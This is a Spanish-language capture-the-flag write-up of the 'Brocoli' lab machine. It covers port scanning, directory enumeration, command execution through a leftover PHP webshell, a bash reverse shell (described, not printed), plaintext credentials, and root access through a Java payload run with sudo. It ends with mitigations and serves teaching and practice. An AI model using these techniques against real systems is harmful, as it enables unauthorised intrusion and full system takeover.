# Brocoli — The Hackers Labs

**Autor:** Carlos de la Cruz Brugue · ASIX 2
**Dificultad:** Media · **Plataforma:** The Hackers Labs

> Resumen de la intrusión: directorio `/uploads` con webshell PHP → RCE vía parámetro `cmd` → reverse shell → credenciales en `/opt` → escalada mediante `sudo java`.

---

## 1. Reconocimiento de puertos

Lanzamos un escaneo completo de Nmap sobre 10.0.2.10. Las opciones empleadas: `-p-` (todos los puertos), `-sSVC` (versiones + scripts), `--min-rate 5000` (velocidad) y `-Pn -n` (sin ping ni DNS).

```bash
nmap -sSVC -p- -Pn -n --min-rate 5000 -vvv 10.0.2.10
```

![Escaneo Nmap](images/01-nmap.png)

El escaneo revela **dos puertos abiertos**: **22 (SSH)** con OpenSSH 9.6p1 y **80 (HTTP)** servido por Apache 2.4.58.

---

## 2. Enumeración web

El puerto 80 muestra la página por defecto de Apache2. Inspeccionando el código fuente encontramos un comentario con una cadena en **Base64**. Además, lanzamos **Gobuster** y descubrimos la ruta `/uploads` (código 301).

```bash
gobuster dir -u http://10.0.2.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
```

![Web por defecto](images/02-web.png)

![Comentario Base64 y Gobuster](images/03-base64-gobuster.png)

En `/uploads` el servidor lista directamente dos archivos: `brocoli.php` e `informebrocoli.txt`.

---

## 3. Análisis de archivos

Decodificamos la cadena Base64 del HTML, que resulta ser `aquinohaynada pelobrocoli` (una pista falsa). Por otro lado, abrimos `informebrocoli.txt`, que contiene una cadena de 32 caracteres identificable como un **hash MD5**.

![Decodificación Base64 e index de uploads](images/04-base64-index.png)

---

## 4. RCE en brocoli.php

Probamos `brocoli.php` pasándole el parámetro `?cmd=id`. El servidor devuelve la salida ejecutada como **`www-data`**, confirmando una vulnerabilidad de **Ejecución Remota de Comandos**.

```
http://10.0.2.10/uploads/brocoli.php?cmd=id
```

![RCE confirmado con cmd=id](images/05-rce.png)

Aprovechamos el webshell para inyectar una **reverse shell de Bash** redirigiendo la E/S a un socket TCP (`/dev/tcp/`) apuntando a nuestra IP y puerto. Codificamos en URL los caracteres especiales (`%20`, `%26`...) para que el servidor procese la cadena sin romperla.

![Inyección de reverse shell codificada en URL](images/06-reverseshell.png)

---

## 5. Captura de la conexión y primera flag

Nos ponemos a la escucha con **Penelope** (un handler en Python más estable que Netcat, que además permite mejorar la TTY para una shell interactiva).

```bash
python3 penelope.py -p 4444
```

![Penelope captura la conexión](images/07-penelope.png)

Ya dentro, hacemos `ls` en el directorio y leemos `informebrocoli.txt` con `cat` para obtener la **primera flag**.

![Primera flag](images/08-userflag.png)

Explorando el sistema, encontramos `credenciales.txt` en `/opt`.

![credenciales.txt en /opt](images/09-credenciales.png)

---

## 6. Cambio de usuario

El archivo de credenciales nos da **`brocoli:megustalafruta`**. Cambiamos a ese usuario con `su brocoli`.

![su brocoli y creación del payload Java](images/10-su-java.png)

---

## 7. Escalada de privilegios (sudo java)

`brocoli` puede ejecutar **Java como root sin contraseña** (`sudo java`). Creamos un payload `Root.java` en `/tmp` que lanza una shell Bash preservando privilegios (`/bin/bash -p`):

```java
public class Root {
  public static void main(String[] args) throws Exception {
    new ProcessBuilder("/bin/bash", "-p").inheritIO().start().waitFor();
  }
}
```

```bash
cd /tmp
# (se crea Root.java con el contenido anterior)
sudo java Root.java
whoami   # -> root
```

El uso de `.inheritIO()` es clave: hace que la consola de root sea interactiva y aparezca directamente en pantalla, dándonos control total.

---

## 8. Flag final (root)

Como root, leemos `/root/root.txt` con `cat` y capturamos la **flag final**.

![Flag de root](images/11-rootflag.png)

---

## Conclusión

Brocoli combina un **webshell PHP** con ejecución de comandos por parámetro (RCE clásico), exposición de credenciales en texto plano (`/opt`) y una escalada vía `sudo java`, otro caso de **GTFOBins** donde un intérprete con privilegios permite spawnear shells. Mitigaciones: no dejar webshells ni archivos de credenciales accesibles, sanear parámetros de entrada y restringir `sudo` sobre intérpretes como Java.
